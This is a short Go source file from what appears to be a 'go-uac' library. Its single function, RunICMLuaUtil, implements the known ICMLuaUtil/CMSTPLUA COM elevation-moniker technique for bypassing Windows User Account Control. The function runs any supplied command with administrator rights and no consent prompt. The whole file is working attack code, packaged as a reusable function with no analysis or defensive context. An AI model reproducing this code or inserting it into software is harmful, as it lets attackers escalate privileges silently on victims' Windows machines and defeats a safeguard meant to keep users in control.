package method

import (
	"go-uac/ole"
	"syscall"
)

func RunICMLuaUtil(szCmd string) error {
	ole.CoInitializeEx(0, 2)
	defer ole.CoUninitialize()

	bindOpts := &ole.BIND_OPTS3{
		ClassContext: 4,
	}

	icm, err := ole.CoGetObject[*ole.ICMLuaUtil](
		"Elevation:Administrator!new:{3e5fc7f9-9a51-4367-9063-a120244fbec7}",
		bindOpts,
		ole.NewGUID("{6edd6d74-c007-4e75-b76a-e5740995e24c}"),
	)

	if err.IsFailed() {
		return err
	}

	defer icm.Release()

	return icm.ShellExec([]byte(szCmd), nil, nil, 0, syscall.SW_SHOW)
}
